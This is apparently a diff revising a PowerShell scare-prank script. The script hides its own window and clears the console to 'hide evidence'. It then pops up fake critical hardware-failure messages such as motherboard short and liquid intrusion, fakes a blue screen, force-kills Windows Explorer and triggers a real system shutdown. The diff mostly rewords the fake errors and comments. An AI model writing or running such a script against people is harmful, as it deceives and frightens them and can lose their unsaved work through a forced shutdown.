@@ -1,7 +1,7 @@
-# Clear terminal history (hides evidence that script was executed)
+# Clear terminal history (hides evidence of execution)
 Clear-Host
 
-# Hides the PowerShell window immediately
+# Instantly hide the PowerShell window
 $psWindow = (Get-Process -Id $PID).MainWindowHandle
 
 # Check if the WinAPI type is already defined
@@ -18,61 +18,61 @@ if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
 "@
 }
 
-# Hide PowerShell Window
-[WinAPI]::ShowWindow($psWindow, 0)
+# Hide PowerShell Immediately (No "1s" output)
+[void][WinAPI]::ShowWindow($psWindow, 0)
 
-# Fake delay to make it feel real
+# Fake delay to build suspense
 Start-Sleep -Seconds 15
 
-# Function to show fake error messages
+# Function to show realistic error messages
 function Show-Error {
     param (
         [string]$message,
         [string]$title
     )
-    [WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0x10)
+    [void][WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0x10)
 }
 
-# List of believable errors to display randomly
+# List of realistic errors (Motherboard & Memory failure)
 $errors = @(
-    "Critical hardware failure: Motherboard voltage instability detected!",
-    "BIOS checksum error: Possible short circuit on mainboard!",
-    "Memory read/write failure: Data corruption detected in sector 0x1A3F",
-    "System temperature alert: CPU and VRM running at dangerous levels!",
-    "PCIe Bus Error: High-speed link failure detected!",
-    "Kernel panic: Unexpected memory dump detected!",
-    "Fatal hardware damage: Water intrusion detected in DIMM slot!",
-    "Component mismatch: CPU registers do not match expected values!",
-    "Voltage irregularity: Sudden power loss may cause permanent damage!",
-    "BIOS boot table corruption: Recovery options limited!",
-    "Chipset failure: Data bus overload detected!"
+    "System Overload: Voltage Surge Detected on PCI Bus.",
+    "BIOS Integrity Failure: Checksum Mismatch Detected!",
+    "Critical RAM Malfunction: Data Leakage Detected.",
+    "Kernel Security Check Failure: Unauthorized Memory Write!",
+    "Corrupt Memory Stack: System Data May Be Permanently Lost!",
+    "Motherboard Bus Failure: Southbridge Chip Unresponsive!",
+    "Fatal Error: Liquid Intrusion Detected Near CPU Socket!",
+    "Memory Controller Failure: Incorrect Read/Write Values!",
+    "VRM Overheat Detected: System May Experience Irreversible Damage!",
+    "CPU Registers Corrupt: Unexpected Instruction Set Detected!",
+    "Data Storage Fault: Filesystem Integrity Compromised!",
+    "Thermal Protection Override: Temperature Sensors Disabled!"
 )
 
-# Display errors at random intervals
+# Display errors at unpredictable intervals
 for ($i = 0; $i -lt 6; $i++) {
-    $errorMessage = $errors | Get-Random
-    Show-Error $errorMessage "SYSTEM CRITICAL ERROR"
+    Show-Error ($errors | Get-Random) "SYSTEM CRITICAL ERROR"
     Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 12)  # Random wait time
 }
 
-# Fake BSOD Sequence (PowerShell reappears)
-[WinAPI]::ShowWindow($psWindow, 5)
+# Fake BSOD Sequence (Reveal PowerShell again)
+[void][WinAPI]::ShowWindow($psWindow, 5)
 
-# Fake blue screen simulation
+# Fake Blue Screen simulation
 Start-Process "cmd.exe" -ArgumentList "/c color 1F && mode con cols=80 lines=25 && echo A critical system error has occurred... && timeout 10" -NoNewWindow -Wait
 
-# Simulated system instability (flashing console messages)
+# Simulated hardware failure (flashing error messages)
 for ($i=0; $i -lt 4; $i++) {
     Start-Process "cmd.exe" -ArgumentList "/c color 4F && echo Memory corruption spreading! && timeout 1" -NoNewWindow -Wait
     Start-Process "cmd.exe" -ArgumentList "/c color 1F && echo CRITICAL FAILURE! Kernel Error!" -NoNewWindow -Wait
 }
 
-# Final warning before fake shutdown
-Show-Error "Operating system integrity compromised! Immediate shutdown required to prevent hardware damage!" "FATAL SYSTEM ERROR"
+# Final catastrophic error
+Show-Error "OS integrity compromised! Immediate shutdown required to prevent hardware damage!" "FATAL SYSTEM ERROR"
 
-# Kill Explorer (makes the screen go blank)
+# Make Windows Explorer disappear (blank screen)
 Stop-Process -Name explorer -Force
 Start-Sleep -Seconds 5
 
-# Fake shutdown
+# Fake Forced Shutdown
 Start-Process "shutdown.exe" -ArgumentList "/s /t 5 /c 'Critical system instability detected! Immediate power off required!'" -NoNewWindow -Wait
